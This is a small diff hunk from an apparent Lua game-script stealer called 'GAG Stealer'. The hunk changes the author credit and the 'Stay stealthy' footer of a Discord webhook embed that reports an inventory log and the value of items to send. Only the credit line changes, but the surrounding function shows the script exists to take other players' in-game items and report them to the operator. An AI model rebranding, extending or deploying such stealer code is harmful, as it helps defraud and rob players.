@@ -410,7 +410,7 @@ function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorit
             {name = "🧾 Inventory Log", value = lines, inline = false}
         },
         footer = {
-            text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
+            text = "🦊 GAG Stealer by erco — Stay stealthy",
             icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
         },
         timestamp = DateTime.now():ToIsoDate()
